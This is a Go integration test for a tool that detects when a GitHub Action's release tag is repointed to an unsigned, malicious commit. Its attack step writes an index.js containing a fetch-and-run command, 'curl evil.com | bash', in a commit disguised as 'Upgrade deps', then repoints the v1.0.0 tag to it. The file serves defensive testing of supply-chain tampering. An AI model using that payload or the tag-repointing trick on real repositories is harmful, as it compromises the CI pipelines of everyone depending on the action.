// Copyright (C) 2026 CoreWeave, Inc.
// SPDX-License-Identifier: GPL-3.0-only

//go:build integration

package harness

import (
	"testing"
	"time"
)

// GPGSignatureDrop tests that repointing a tag from a GPG-signed commit
// to an unsigned commit triggers detection.
//
// Note: We can't actually GPG-sign commits via the GitHub API without a GPG key,
// so the GPG-specific signal (SIGNATURE_DROPPED) requires spec 017's gate
// integration to be fully wired. For now, this scenario verifies the tag
// repoint is detected via scan. The SIGNATURE_DROPPED assertion is TODO'd.
type GPGSignatureDrop struct{}

func (s *GPGSignatureDrop) Name() string { return "gpg-signature-drop" }

func (s *GPGSignatureDrop) Setup(t *testing.T, h *TestHelper, repo, initSHA, initTree string) *ScenarioState {
	t.Helper()
	r := repoName(repo)

	// Create a legitimate action with a tag
	blob := h.CreateBlob(t, r, "name: my-action\ndescription: test\nruns:\n  using: node20\n  main: index.js\n")
	jsBlob := h.CreateBlob(t, r, "console.log('ok');\n")
	tree := h.CreateTree(t, r, initTree, map[string]string{
		"action.yml": blob,
		"index.js":   jsBlob,
	})
	goodCommit := h.CreateCommit(t, r, "Initial release", tree, []string{initSHA})
	h.UpdateBranch(t, r, "main", goodCommit)
	h.CreateLightweightTag(t, r, "v1.0.0", goodCommit)

	time.Sleep(2 * time.Second)

	cfg := writeConfig(t, repo, []string{"v1.0.0"})
	return &ScenarioState{
		TagSHAs:    map[string]string{"v1.0.0": goodCommit},
		ConfigPath: cfg,
		StatePath:  t.TempDir() + "/state.json",
	}
}

func (s *GPGSignatureDrop) Attack(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()
	r := repoName(repo)

	// Create unsigned evil commit and repoint the tag
	evilBlob := h.CreateBlob(t, r, "name: my-action\ndescription: evil\nruns:\n  using: node20\n  main: index.js\n")
	evilJsBlob := h.CreateBlob(t, r, "const cp = require('child_process'); cp.execSync('curl evil.com | bash');\n")
	initTree := h.GetCommitTree(t, r, state.TagSHAs["v1.0.0"])
	evilTree := h.CreateTree(t, r, initTree, map[string]string{
		"action.yml": evilBlob,
		"index.js":   evilJsBlob,
	})
	evilCommit := h.CreateCommit(t, r, "Upgrade deps", evilTree, []string{state.TagSHAs["v1.0.0"]})
	h.RepointTag(t, r, "v1.0.0", evilCommit)
	state.EvilSHA = evilCommit
}

func (s *GPGSignatureDrop) Verify(t *testing.T, h *TestHelper, repo string, state *ScenarioState) {
	t.Helper()

	// Scan detects the tag repoint via state comparison
	output, code := RunPinpointScan(t, state.ConfigPath, state.StatePath)
	if code != 2 {
		t.Fatalf("Expected scan exit 2, got %d. Output:\n%s", code, output)
	}
	assertContains(t, output, "TAG_REPOINTED")
	assertContains(t, output, "SEMVER_REPOINT")

	// TODO: Once spec 017 gate integration is fully wired, switch back to
	// gate-based verification with a lockfile containing gpg_signed: true
	// and assert SIGNATURE_DROPPED fires.
}
